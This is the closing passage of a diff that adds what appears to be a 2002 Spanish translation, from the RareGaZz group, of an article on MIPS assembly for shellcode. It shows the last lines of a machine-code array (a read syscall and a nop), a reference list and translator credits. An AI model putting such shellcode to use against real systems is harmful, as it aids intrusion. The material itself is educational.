+		0x240203eb,	/* li		$v0, SYS_read		*/
+		0x0101010c,	/* syscall				*/
+		0x24187350,	/* li		$t8, 0x7350 (nop)	*/
+};
+<-->
+
+
+----|  Referencias
+
+Para mas informacion puedes querer consultar estas excelentes referencias:
+
+ [1] See MIPS Run
+     Dominic Sweetman, Morgan Kaufmann Publishers
+     ISBN 1-55860-410-3
+
+ [2] MIPSPro Assembly Language Programmer's Guide - Volume 1/2
+     Document Number 007-2418-001
+     http://www.mips.com/ and http://www.sgi.com/
+
+|EOF|-------------------------------------------------------------------------|
+
+
+ Traducido por Active Matrix - schyzophrenia@gmx.net
+ Para RareGaZz - http://www.raregazz.com.ar - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
